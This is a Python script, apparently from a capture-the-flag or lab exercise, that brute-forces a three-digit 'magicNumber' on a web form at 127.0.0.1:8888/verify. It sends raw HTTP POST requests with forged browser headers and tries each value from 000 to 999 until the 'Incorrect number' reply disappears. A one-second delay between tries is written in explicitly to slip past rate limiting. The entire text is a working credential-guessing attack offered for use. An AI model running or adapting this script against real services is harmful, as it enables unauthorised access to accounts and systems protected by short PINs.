import socket
import time

# Define the server address and port
HOST = '127.0.0.1'  # Server address
PORT = 8888          # Port number

# Function to send the POST request using a raw socket connection
def send_request(pin):
    # Create the raw POST request with the magicNumber
    request = f"POST /verify HTTP/1.1\r\n"
    request += f"Host: {HOST}:{PORT}\r\n"
    request += f"Connection: keep-alive\r\n"
    request += f"Content-Length: {len('magicNumber=' + pin)}\r\n"
    request += f"Cache-Control: max-age=0\r\n"
    request += f"Content-Type: application/x-www-form-urlencoded\r\n"
    request += f"Upgrade-Insecure-Requests: 1\r\n"
    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\r\n"
    request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
    request += f"Sec-Fetch-Site: same-origin\r\n"
    request += f"Sec-Fetch-Mode: navigate\r\n"
    request += f"Sec-Fetch-User: ?1\r\n"
    request += f"Sec-Fetch-Dest: document\r\n"
    request += f"Referer: http://{HOST}:{PORT}/\r\n"
    request += f"Accept-Encoding: gzip, deflate, br\r\n"
    request += f"Accept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\n"
    request += f"\r\n"
    request += f"magicNumber={pin}\r\n"

    # Create a socket connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(request.encode())

        # Receive the server's response
        response = s.recv(4096).decode()
        
        return response

# Brute-force loop to try numbers from 000 to 999
def brute_force():
    for i in range(1000):
        # Format the number with leading zeros to match the input (e.g., 000, 001, 002, ..., 999)
        pin = f"{i:03}"
        print(f"Trying {pin}...")

        response = send_request(pin)
        
        if "Incorrect number" not in response:
            print(f"Success! The magic number is: {pin}")
            break
        
        # Wait for 1 second before the next attempt (handle rate limiting)
        time.sleep(1)

# Start brute-forcing
brute_force()
